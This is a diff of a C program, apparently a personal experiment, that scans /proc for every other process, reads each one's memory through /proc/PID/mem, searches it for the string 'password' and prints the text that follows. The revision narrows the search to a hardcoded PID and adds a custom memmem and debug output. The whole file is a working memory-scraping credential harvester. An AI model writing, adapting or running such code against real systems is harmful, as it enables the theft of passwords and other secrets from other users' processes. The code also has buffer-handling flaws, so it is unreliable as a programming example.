@@ -1,18 +1,42 @@
 #include <dirent.h>
-#define _GNU_SOURCE /* See feature_test_macros(7) */
 #include <signal.h>
 #include <stddef.h>
 #include <stdio.h>
 #include <stdlib.h>
 #include <string.h>
-// #define _POSIX_SOURCE -> is that needed? [02:55]
+#include <ctype.h>
 #include <fcntl.h>
 #include <unistd.h>
 
-const char *looking_for = "PASSWORD";
+const char *looking_for = "password: ./a.out";
+
+void *memmem(const void *haystack, size_t hlen, const void *needle, size_t nlen)
+{
+    int needle_first;
+    const void *p = haystack;
+    size_t plen = hlen;
+
+    if (!nlen)
+        return NULL;
+
+    needle_first = *(unsigned char *)needle;
+
+    while (plen >= nlen && (p = memchr(p, needle_first, plen - nlen + 1)))
+    {
+        if (!memcmp(p, needle, nlen))
+            return (void *)p;
+
+        p++;
+        plen = hlen - (p - haystack);
+    }
+
+    return NULL;
+}
 
 int main(int argc, char **argv) {
   pid_t current_pid = getpid();
+
+  printf("**current_pid** %d\n", current_pid);
 
   struct dirent *dirent;
   DIR *proc_dir = opendir("/proc");
@@ -20,6 +44,7 @@ int main(int argc, char **argv) {
   while ((dirent = readdir(proc_dir)) != NULL) {
     // there is no process 0
     int pid = strtol(dirent->d_name, NULL, 10);
+    printf("[pid] %d\n", pid);
     if (pid && pid != current_pid) {
       char maps_path[32];
       char mem_path[32];
@@ -27,9 +52,7 @@ int main(int argc, char **argv) {
       sprintf(maps_path, "/proc/%s/maps", dirent->d_name);
       sprintf(mem_path, "/proc/%s/mem", dirent->d_name);
 
-      // printf("maps -> %s\n", maps_path);
 
-      // maps
       FILE *maps = fopen(maps_path, "r");
       if (maps == NULL) {
         perror("[ERROR] couldn't open maps file");
@@ -43,67 +66,45 @@ int main(int argc, char **argv) {
         continue;
       }
 
-      // FILE *mem = fopen(mem_path, "r");
-      // if (mem == NULL) {
-      //   perror("[ERROR] couldn't open maps file");
-      //   // if maps is readable but mem is not, check if that's possible
-      //   fclose(maps);
-      //   continue;
-      // }
-
       size_t line_length = 128;
       int bytes_read = 0;
       char *map_line = NULL;
 
       while ((bytes_read = getline(&map_line, &line_length, maps)) != -1) {
-        // TODO: not sure how to store the start and the end
-        char start_str[16];
-        char end_str[16];
-
-        // printf("LINE: %s\n", map_line);
-
-        // use strtol directly and pass end_ptr?
-        // sscanf(map_line, "%12s-%12s", start_str, end_str);
-        // printf("[ADDRESS] %s-%s\n", start_str, end_str);
-
-        char* end_ptr;
-        long int start = strtol(map_line, &end_ptr, 16);
+        char *end_ptr;
+        unsigned long int start = strtol(map_line, &end_ptr, 16);
         end_ptr++;
-        long int end = strtol(end_ptr, NULL, 16);
+        unsigned long int end = strtol(end_ptr, NULL, 16);
 
-        // SEEK_SET or SEEK_CUR?
         lseek(mem, start, SEEK_SET);
-        long int size = end - start;
-       
-        if(size < 0){
-          printf("***SIZE*** %ld\n", size);
-          continue;
-        }
+        unsigned long int size = end - start;
 
-        char *data = malloc(size + 1);
-
+        char *data = malloc(size);
         read(mem, data, size);
 
-        char* match = strstr(data, "password");
-        if(match != NULL){
-          // printf("[PASSWORD]: %s\n", match);
-          for(int i = 0; i <= 80; i++){
-            putchar(match[i]);
+        char* search_str = "password";
+        char *match = memmem(data, size, search_str, strlen(search_str));
+
+        if (match != NULL && pid == 1203) {
+          printf("PID: %d\n", pid);
+          for (int i = 0; i < 1000; i++) {
+            if (isascii(match[i])) {
+              putchar(match[i]);
+            } else {
+              break;
+            }
           }
-
-            putchar('\n');
+          putchar('\n');
         }
-
         free(data);
       };
 
       free(map_line);
       fclose(maps);
-      // fclose(mem);
+      close(mem);
     }
   }
 
-  printf("PID %d \n", current_pid);
   closedir(proc_dir);
   return 0;
 }
